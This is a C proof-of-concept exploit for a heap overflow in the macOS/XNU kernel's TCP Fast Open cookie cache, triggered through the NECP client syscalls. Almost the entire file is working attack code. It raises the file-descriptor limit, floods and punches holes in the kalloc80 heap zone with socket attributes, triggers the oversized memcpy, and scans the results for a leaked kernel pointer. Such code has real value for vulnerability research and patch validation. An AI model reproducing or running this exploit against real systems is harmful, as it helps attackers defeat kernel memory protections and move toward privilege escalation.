//This POC causes a kernel heap overflow in tcp_cache_set_cookie_common (see bsd/netinet/tcp_cache.c).  A
//user-supplied length is passed to memcpy, which causes the destination struct tcp_cache allocation to be overflown.
//Unfortunately, the size of the source memory object is limited, so we cannot directly control the contents copied to the
//overflown area.  The source memory object is on the stack (tfo_cache_buffer in necp_client_update_cache).  More analysis is
//needed to determine how much control of the stack based objects after the source memory object is possible.
//
//The stack trace at the time of the overflow is:
//tcp_cache_set_cookie_common
//tcp_heuristics_tfo_update
//necp_client_update_cache
//necp_client_action (syscall)

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <pthread.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/proc_info.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <unistd.h>
#include <uuid/uuid.h>

////////////////////////////////////////////////////////////////////////////////////////////////////
// Kernel defines missing from userland ////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////

#define      SO_NECP_ATTRIBUTES      0x1109  /* NECP socket attributes (domain, account, etc.) */

//Taken from bsd/net/necp.h
#define NECP_TLV_ATTRIBUTE_DOMAIN       7
#define NECP_TLV_ATTRIBUTE_ACCOUNT      8

#define NECP_OPEN_FLAG_OBSERVER      0x01 // Observers can query clients they don't own
#define NECP_OPEN_FLAG_BACKGROUND    0x02 // Mark this fd as backgrounded
#define NECP_OPEN_FLAG_PUSH_OBSERVER 0x04 // When used with the OBSERVER flag, allows updates to be pushed. Adding clients is not allowed in this mode.

#define NECP_CLIENT_ACTION_ADD              1 // Register a new client. Input: parameters in buffer; Output: client_id
#define NECP_CLIENT_ACTION_REMOVE           2 // Unregister a client. Input: client_id, optional struct ifnet_stats_per_flow
#define NECP_CLIENT_ACTION_COPY_PARAMETERS        3 // Copy client parameters. Input: client_id; Output: parameters in buffer
#define NECP_CLIENT_ACTION_COPY_RESULT          4 // Copy client result. Input: client_id; Output: result in buffer
#define NECP_CLIENT_ACTION_COPY_LIST          5 // Copy all client IDs. Output: struct necp_client_list in buffer
#define NECP_CLIENT_ACTION_REQUEST_NEXUS_INSTANCE   6 // Request a nexus instance from a nexus provider, optional struct necp_stats_bufreq
#define NECP_CLIENT_ACTION_AGENT            7 // Interact with agent. Input: client_id, agent parameters
#define NECP_CLIENT_ACTION_COPY_AGENT         8 // Copy agent content. Input: agent UUID; Output: struct netagent
#define NECP_CLIENT_ACTION_COPY_INTERFACE       9 // Copy interface details. Input: ifindex cast to UUID; Output: struct necp_interface_details
#define NECP_CLIENT_ACTION_SET_STATISTICS       10 // Deprecated
#define NECP_CLIENT_ACTION_COPY_ROUTE_STATISTICS    11 // Get route statistics. Input: client_id; Output: struct necp_stat_counts
#define NECP_CLIENT_ACTION_AGENT_USE          12 // Return the use count and increment the use count. Input/Output: struct necp_agent_use_parameters
#define NECP_CLIENT_ACTION_MAP_SYSCTLS          13 // Get the read-only sysctls memory location. Output: mach_vm_address_t
#define NECP_CLIENT_ACTION_UPDATE_CACHE         14 // Update heuristics and cache
#define NECP_CLIENT_ACTION_COPY_CLIENT_UPDATE     15 // Fetch an updated client for push-mode observer. Output: Client id, struct necp_client_observer_update in buffer
#define NECP_CLIENT_ACTION_COPY_UPDATED_RESULT      16 // Copy client result only if changed. Input: client_id; Output: result in buffer

#define NECP_CLIENT_CACHE_TYPE_ECN                 1       // Identifies use of necp_tcp_ecn_cache
#define NECP_CLIENT_CACHE_TYPE_TFO                 2       // Identifies use of necp_tcp_tfo_cache

#define NECP_CLIENT_CACHE_TYPE_ECN_VER_1           1       // Currently supported version for ECN
#define NECP_CLIENT_CACHE_TYPE_TFO_VER_1           1       // Currently supported version for TFO

#define NECP_MAX_CLIENT_PARAMETERS_SIZE         1024
#define NECP_TFO_COOKIE_LEN_MAX      16

typedef uint64_t           mach_vm_address_t;
typedef struct necp_cache_buffer {
  u_int8_t                necp_cache_buf_type;    //  NECP_CLIENT_CACHE_TYPE_*
  u_int8_t                necp_cache_buf_ver;     //  NECP_CLIENT_CACHE_TYPE_*_VER
  u_int32_t               necp_cache_buf_size;
  mach_vm_address_t       necp_cache_buf_addr;
} necp_cache_buffer;

typedef struct necp_tcp_tfo_cache {
  u_int8_t                necp_tcp_tfo_cookie[NECP_TFO_COOKIE_LEN_MAX];
  u_int8_t                necp_tcp_tfo_cookie_len;
  u_int8_t                necp_tcp_tfo_heuristics_success:1; // TFO succeeded with data in the SYN
  u_int8_t                necp_tcp_tfo_heuristics_loss:1; // TFO SYN-loss with data
  u_int8_t                necp_tcp_tfo_heuristics_middlebox:1; // TFO middlebox detected
  u_int8_t                necp_tcp_tfo_heuristics_success_req:1; // TFO succeeded with the TFO-option in the SYN
  u_int8_t                necp_tcp_tfo_heuristics_loss_req:1; // TFO SYN-loss with the TFO-option
  u_int8_t                necp_tcp_tfo_heuristics_rst_data:1; // Recevied RST upon SYN with data in the SYN
  u_int8_t                necp_tcp_tfo_heuristics_rst_req:1; // Received RST upon SYN with the TFO-option
} necp_tcp_tfo_cache;

//Taken from bsd/sys/socket.h
#define      SO_NECP_CLIENTUUID      0x1111  /* NECP Client uuid */

struct tlv
{
	uint8_t type;
	uint32_t length;
	unsigned char value[0];
} __attribute__((packed));

////////////////////////////////////////////////////////////////////////////////////////////////////
// Globals and config options //////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////

#define NUM_ATTRIBUTE_SOCKETS 10230
#define MAX_SOCKETS 10230

static int sockets[MAX_SOCKETS];
const char * sockets_ip = "127.0.0.1";
int socket_port_num = 3333;

static int connected_sockets[3];
static int necp_fd;
static uuid_t necp_client_id; 

////////////////////////////////////////////////////////////////////////////////////////////////////
// Helper functions ////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////

int necp_open(int flags)
{
	return syscall(501, flags);
}

int necp_client_action(int necp_fd, uint32_t action, uuid_t client_id, size_t client_id_len, uint8_t *buffer, size_t buffer_size)
{
	return syscall(502, necp_fd, action, client_id, client_id_len, buffer, buffer_size);
}

void print_uuid(char * caption, uuid_t * uuid)
{
	unsigned char * uuid_char = (unsigned char *)uuid;
	printf("%s: %02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x\n", caption,
		uuid_char[0], uuid_char[1], uuid_char[2], uuid_char[3], uuid_char[4], uuid_char[5], uuid_char[6], uuid_char[7],
		uuid_char[8], uuid_char[9], uuid_char[10], uuid_char[11], uuid_char[12], uuid_char[13], uuid_char[14], uuid_char[15]);
}

void create_connected_socket(int * socks)
{
	int server_sock, client_sock;
	int bind_count = 0;
	int opt = 1;
	struct sockaddr_in addr;
	socklen_t addr_len;

	//Create the socket pair

	server_sock = socket(PF_INET, SOCK_STREAM, 0);
	if(server_sock < 0) {
		printf("Couldn't create server socket: errno %d: %s\n", errno, strerror(errno));
		exit(1);
	}
	client_sock = socket(PF_INET, SOCK_STREAM, 0);
	if(client_sock < 0) {
		printf("Couldn't create client socket: errno %d: %s\n", errno, strerror(errno));
		exit(1);
	}

	//Bind the server to a port
	opt = 1;
	setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

	while(1)
	{
		memset(&addr, 0, sizeof(addr));
		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = inet_addr(sockets_ip);
		addr.sin_port = htons(socket_port_num);
		socket_port_num++;

		if(bind(server_sock, (struct sockaddr *)&addr, sizeof(addr)) >= 0)
			break;
		bind_count++;
		if(bind_count == 10) {
			printf("Couldn't bind to the socket: errno %d: %s\n", errno, strerror(errno));
			exit(1);
		}
	}
	if(listen(server_sock, 5) < 0) {
		printf("Couldn't listen on the socket: errno %d: %s\n", errno, strerror(errno));
		exit(1);
	}

	//Connect to the server from the client
	if(connect(client_sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		printf("Couldn't connect the socket: errno %d: %s\n", errno, strerror(errno));
		exit(1);
	}

	addr_len = sizeof(addr);
	socks[2] = accept(server_sock, (struct sockaddr *)&addr, &addr_len);
	if(socks[2] < 0)
	{
		printf("Couldn't accept the socket: errno %d: %s\n", errno, strerror(errno));
		exit(1);
	}
	socks[1] = server_sock;
	socks[0] = client_sock;
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// Exploit step functions //////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////

static void prep_attribute_flood(int number)
{
	int i;

	if(number > MAX_SOCKETS)
	{
		printf("Can't ask for more than %d sockets (asked for %d\n", MAX_SOCKETS, number);
		exit(1);
	}

	//Allocate all the sockets first
	memset(sockets, 0, sizeof(sockets));
	for(i = 0; i < number; i++)
	{
		sockets[i] = socket(PF_INET, SOCK_STREAM, 0);
		if(sockets[i] < 0) {
			printf("Couldn't create server socket: errno %d: %s\n", errno, strerror(errno));
			exit(1);
		}
	}
}

static inline void set_attributes_with_content(int sock, int num_attributes, int length, char * content, char * content2)
{
	struct tlv * value, * current;
	char buffer[1024];
	size_t buffer_size;
	size_t value_size = length;

	if(num_attributes > 2 || num_attributes < 0)
	{
		printf("Bad num_attributes %d\n", num_attributes);
		exit(1);
	}

	buffer_size = 2 * (sizeof(struct tlv) + value_size);
	if(buffer_size > sizeof(buffer))
	{
		printf("Bad buffer size");
		exit(1);
	}
	current = (struct tlv *)buffer;
	current->type = NECP_TLV_ATTRIBUTE_DOMAIN;
	current->length = num_attributes > 0 ? value_size : 0;
	memcpy(current->value, content, current->length);
	current = (struct tlv *)(((char *)current) + (sizeof(struct tlv) + current->length));
	current->type = NECP_TLV_ATTRIBUTE_ACCOUNT;
	current->length = num_attributes > 1 ? value_size : 0;
	memcpy(current->value, content2, current->length);

	if(setsockopt(sock, SOL_SOCKET, SO_NECP_ATTRIBUTES, buffer, buffer_size) < 0)
	{
		printf("setsockopt failed: errno %d: %s\n", errno, strerror(errno));
		exit(1);
	}
}

static inline void set_attributes(int sock, int num_attributes)
{
	char buffer[80];
	memset(buffer, 0x88, 79);
	set_attributes_with_content(sock, num_attributes, 79, buffer, buffer); 
}

static inline uint64_t print_attributes(int sock)
{
	unsigned char * buffer, * value;
	struct tlv * current;
	socklen_t buffer_size, i;
	uint32_t len;

	buffer_size = 100;
	buffer = malloc(buffer_size);
	memset(buffer, 0, buffer_size);

	if(getsockopt(sock, SOL_SOCKET, SO_NECP_ATTRIBUTES, buffer, &buffer_size) < 0)
	{
		printf("getsockopt failed: errno %d: %s\n", errno, strerror(errno));
		exit(1);
	}

	printf("print_attributes buffer_size %u:\n", buffer_size);
	for(i = 0; i < buffer_size; i++)
		printf("%02X", buffer[i]);
	printf("\n");

	//free(buffer);
	return 0;
}

static inline uint64_t get_attributes(int sock)
{
	unsigned char * buffer, * value;
	struct tlv * current;
	socklen_t buffer_size, i;
	uint32_t len;

	buffer_size = 1024;
	buffer = malloc(buffer_size);
	memset(buffer, 0, buffer_size);

	if(getsockopt(sock, SOL_SOCKET, SO_NECP_ATTRIBUTES, buffer, &buffer_size) < 0)
	{
		printf("getsockopt failed: errno %d: %s\n", errno, strerror(errno));
		exit(1);
	}

#define IS_PTR_VALUE(x) (x != 0x88 && x != 0)

	current = (struct tlv *)buffer;	
	while((unsigned char *)current < buffer + buffer_size)
	{
		len = current->length;	
		value = current->value;	

		if(IS_PTR_VALUE(value[0]) || IS_PTR_VALUE(value[1]) || IS_PTR_VALUE(value[2]) || IS_PTR_VALUE(value[3]))
			return *((uint64_t *)value);
		current = (struct tlv *)(((char *)current) + (sizeof(struct tlv) + current->length));
	}

	//free(buffer);
	return 0;
}

static void allocate_many_attributes(int number)
{
	struct tlv * value, * current;
	size_t buffer_size;
	size_t value_size = 79;
	int i;

	if(number > MAX_SOCKETS)
	{
		printf("Can't ask for more than %d sockets (asked for %d\n", MAX_SOCKETS, number);
		exit(1);
	}

	buffer_size = 2 * (sizeof(struct tlv) + value_size);
	value = current = malloc(buffer_size);
	current->type = NECP_TLV_ATTRIBUTE_DOMAIN;
	current->length = value_size;
	memset(current->value, 0x88, value_size);
	current = (struct tlv *)(((char *)current) + (sizeof(struct tlv) + value_size));
	current->type = NECP_TLV_ATTRIBUTE_ACCOUNT;
	current->length = value_size;
	memset(current->value, 0x88, value_size);

	for(i = 0; i < number; i++)
	{
		if(setsockopt(sockets[i], SOL_SOCKET, SO_NECP_ATTRIBUTES, value, buffer_size) < 0)
		{
			printf("setsockopt failed: errno %d: %s\n", errno, strerror(errno));
			exit(1);
		}
	}

	free(value);
}

static void close_sockets(int number)
{
	int i;

	if(number > MAX_SOCKETS)
	{
		printf("Can't ask for more than %d sockets (asked for %d\n", MAX_SOCKETS, number);
		exit(1);
	}

	for(i = 0; i < number; i++)
	{
		if(sockets[i] != 0)
			close(sockets[i]);
	}
}

static void tcp_cache_prep(void)
{
	int ret;
	uint8_t * buffer;
	size_t buffer_size;

	//Use necp_open to get a necp file descriptor
	necp_fd = necp_open(0);
	if(necp_fd < 0)
	{
		printf("Couldn't get a necp fd: errno %d: %s\n", errno, strerror(errno));
		exit(1);
	}

	//Setup a necp client and get the uuid
	memset(necp_client_id, 0, sizeof(uuid_t));
	buffer = malloc(0x10);
	memset(buffer, 0, 0x10);
	buffer_size = 0x10;

	ret = necp_client_action(necp_fd, NECP_CLIENT_ACTION_ADD, necp_client_id, sizeof(uuid_t), buffer, buffer_size);
	if(ret < 0) {
		printf("Couldn't add a necp client: errno %d: %s\n", errno, strerror(errno));
		exit(1);
	}
	//print_uuid("client uuid:", necp_client_id);

	//Create a socket and add a flow to the client
	create_connected_socket(connected_sockets);

	if(setsockopt(connected_sockets[2], SOL_SOCKET, SO_NECP_CLIENTUUID, necp_client_id, sizeof(uuid_t)) < 0) {
		printf("Couldn't assign the socket to the necp client: errno %d: %s\n", errno, strerror(errno));
		exit(1);
	}
}

static void tcp_cache_cleanup(void)
{
	close(connected_sockets[0]);
	close(connected_sockets[1]);
	close(connected_sockets[2]);
	close(necp_fd);
}

static void set_necp_tcp_cache(int cookie_len)
{
	necp_cache_buffer ncb;
	necp_tcp_tfo_cache nttc;
	int ret;

	//Create a cache item
	memset(&nttc, 0, sizeof(necp_tcp_tfo_cache));
	nttc.necp_tcp_tfo_cookie_len = cookie_len;
	nttc.necp_tcp_tfo_heuristics_success=1;

	memset(&ncb, 0, sizeof(necp_cache_buffer));
	ncb.necp_cache_buf_type = NECP_CLIENT_CACHE_TYPE_TFO;
	ncb.necp_cache_buf_ver = NECP_CLIENT_CACHE_TYPE_TFO_VER_1;
	ncb.necp_cache_buf_size = sizeof(necp_tcp_tfo_cache);
	ncb.necp_cache_buf_addr = (mach_vm_address_t)&nttc;

	ret = necp_client_action(necp_fd, NECP_CLIENT_ACTION_UPDATE_CACHE, necp_client_id, sizeof(uuid_t), (uint8_t *)&ncb, sizeof(necp_cache_buffer));
	if(ret != 0)
	{
		printf("necp_client_action(UPDATE_CACHE): ret=%d (errno %d: %s)\n", ret, errno, strerror(errno));
		exit(1);
	}
}

void memory_flood(void)
{
	pid_t child;
	int i, status;
	
	child = fork();
	if(child < 0)
	{
		printf("Couldn't fork\n");
		exit(1);
	}

	if(child == 0)
	{
		system("python -c 'a=range(0,10);a*=100000000'");
		exit(0);
	}

	sleep(5);
	for(i = 0; i < 5; i++)
	{
		kill(child, SIGKILL);
		kill(child, SIGTERM);
		sleep(1);
	}
	wait4(child, &status, 0, NULL);
}


////////////////////////////////////////////////////////////////////////////////////////////////////
// Main Execution //////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////

uint64_t leak_kernel_ptr()
{
	int i;
	uint64_t kernel_ptr;

	//Step 0: Setup the necessary parts for the flood and overflow
	tcp_cache_prep();
	prep_attribute_flood(NUM_ATTRIBUTE_SOCKETS);

	//Step 1: Flood the kalloc80 zone with allocations using necp string attributes
	allocate_many_attributes(NUM_ATTRIBUTE_SOCKETS);

	//Step 2: Free a bunch of necp string attributes (this should basically free every other one)
	for(i = 0; i < NUM_ATTRIBUTE_SOCKETS; i++)
		set_attributes(sockets[i], 1);

	//Step 3: Do the overflow.
	set_necp_tcp_cache(32);

	//Step 4: Find the overflown data	
	kernel_ptr = 0;
	for(i = 0; i < NUM_ATTRIBUTE_SOCKETS && kernel_ptr == 0; i++)
		kernel_ptr = get_attributes(sockets[i]);

	//Step 5: Cleanup
	close_sockets(NUM_ATTRIBUTE_SOCKETS);
	tcp_cache_cleanup();

	return kernel_ptr;
}

int main(int argc, char ** argv)
{
	struct rlimit rlp;
	uint64_t kernel_ptr;

	if(argc > 1)
		sockets_ip = argv[1];

	printf("Running exploit from process %d using ip %s\n", getpid(), sockets_ip);

	//Step -1: Get the kernel to release any completely free pages
	memory_flood();

	//Step 0: Update the file descriptor limit so we can flood our heap region
	rlp.rlim_cur = 10240;
	rlp.rlim_max = 10240;
	if(setrlimit(RLIMIT_NOFILE, &rlp))
	{
		printf("Couldn't raise number of file descriptors\n");
		exit(1);
	}

	//Step 2: Leak a kernel pointer
	kernel_ptr = leak_kernel_ptr();
	printf("leaked: %llx\n", kernel_ptr);

	return 0;
}

